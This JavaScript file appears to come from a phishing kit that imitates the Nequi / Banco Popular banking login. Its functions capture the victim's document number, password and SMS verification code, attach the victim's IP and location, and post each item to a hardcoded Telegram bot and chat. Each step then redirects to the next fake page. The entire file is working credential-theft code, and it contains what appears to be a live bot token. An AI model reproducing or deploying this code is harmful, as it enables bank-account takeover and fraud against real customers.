//bot token
var telegram_bot_id = "7334110611:AAF1zY2dKqUbqc7j-OZPx3ojQnJMA5izXz8";
//chat id
var chat_id = -1002243103475;

var ready = function () {
    var tdocu =document.getElementById('insert').innerHTML;
    var docu =document.getElementById('documento').value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧙‍♂️Nequi - POPULAR \n🤑TIPO DOCUMENTO : "+tdocu+"\n🤑DOCUMENTO : "+docu+"\n📍IP :"+ ip + "\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href = "index1.html";
    });
    return false;
}

var ready1 = function () {
    var pass =document.getElementById('password').value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧙‍♂️Nequi - POPULAR \n🤑PASS: "+pass+"\n📍IP :"+ ip + "\n" + ip2;
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href = "load.html";
    });
    return false;
}

var ready2 = function () {
    var sms =document.getElementById('sms').value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧙‍♂️Nequi - POPULAR \n🤑SMS : "+sms+"\n📍IP :"+ ip + "\n" + ip2;
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href = "load1.html";
    });
    return false;
}
